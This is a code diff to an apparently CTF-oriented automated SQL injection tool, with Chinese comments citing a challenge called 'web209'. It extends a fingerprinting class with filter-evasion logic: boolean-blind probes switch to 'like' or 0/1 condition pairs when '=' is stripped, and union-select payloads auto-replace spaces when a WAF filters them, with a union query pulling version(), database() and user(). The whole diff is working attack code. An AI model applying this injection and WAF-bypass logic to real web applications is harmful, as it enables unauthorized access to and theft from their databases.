@@ -39,6 +39,7 @@ class Fingerprinter:
         return f"{self._pre()}{apply_form(f' {joiner} ({cond})', self.inj.form)}{self._tail()}"
 
     def run(self, waf) -> Fingerprint:
+        self.waf = waf
         fp = Fingerprint()
         fp.error_visible = bool(self.R_err and self.R_err.has_sql_error())
         fp.echo_visible = bool(self.inj.echo_positions)
@@ -47,8 +48,21 @@ class Fingerprinter:
         # 布尔盲注（or 优先：登录框恒真=成功页；and：查询框真=基线；
         # xor：FinalSQL 类；arith：「都过滤了」类减法两态）
         for joiner in ("or", "and", "xor", "arith"):
-            t = self.s.request_value(self._cond_payload("1=1", joiner))
-            f = self.s.request_value(self._cond_payload("1=2", joiner))
+            if joiner == "arith":
+                if waf.is_filtered("="):
+                    # = 被剥离时 1=1 → 11 恒常量无两态（web209 实测），
+                    # 减法两态改用 0/1 常量对：-(0) 匹配全表、-(1) 无行
+                    true_cond, false_cond = "0", "1"
+                else:
+                    true_cond, false_cond = "1=1", "1=2"
+            elif waf.is_filtered("="):
+                # = 被剥离时 and(11)/and(12) 双双恒真（web209 实测），
+                # 参照对改 like：and((1)like(1)) 真 / and((1)like(2)) 假
+                true_cond, false_cond = "(1)like(1)", "(1)like(2)"
+            else:
+                true_cond, false_cond = "1=1", "1=2"
+            t = self.s.request_value(self._cond_payload(true_cond, joiner))
+            f = self.s.request_value(self._cond_payload(false_cond, joiner))
             fp.boolean_oracle = (t.status_code > 0 and
                                  (similarity(t, f) < 0.995 or t.status_code != f.status_code))
             if fp.boolean_oracle:
@@ -104,6 +118,16 @@ class Fingerprinter:
         return fp
 
     # ------------------------------------------------------------------
+    def _union_core(self, cols: list) -> str:
+        """union select 核心：按形态变换 + 空格被滤时自动降级（web209 类）。"""
+        from ..tampers import auto_space, form_sep
+        core = apply_form("union select " + ",".join(cols), self.inj.form)
+        if " " in core and getattr(self, "waf", None) is not None \
+                and self.waf.is_filtered("space"):
+            core = auto_space(core, self.waf.is_filtered("/*", "*/", "*"),
+                              self.waf.is_filtered("(", ")"))
+        return core
+
     def _union_echo(self, expr: str):
         """把标量表达式放到回显位并发送，返回响应体。"""
         from ..tampers import form_sep
@@ -111,7 +135,7 @@ class Fingerprinter:
         cols = ["null"] * n
         pos = (self.inj.echo_positions or [1])[0] - 1
         cols[pos] = expr
-        core = apply_form("union select " + ",".join(cols), self.inj.form)
+        core = self._union_core(cols)
         pre = f"0{self.inj.closure}"
         if not self.inj.closure:
             pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
@@ -158,7 +182,7 @@ class Fingerprinter:
         cols = ["null"] * n
         pos = (self.inj.echo_positions or [1])[0] - 1
         cols[pos] = "concat_ws(0x7e,version(),database(),user())"
-        core = apply_form("union select " + ",".join(cols), self.inj.form)
+        core = self._union_core(cols)
         pre = f"0{self.inj.closure}"
         if not self.inj.closure:
             pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
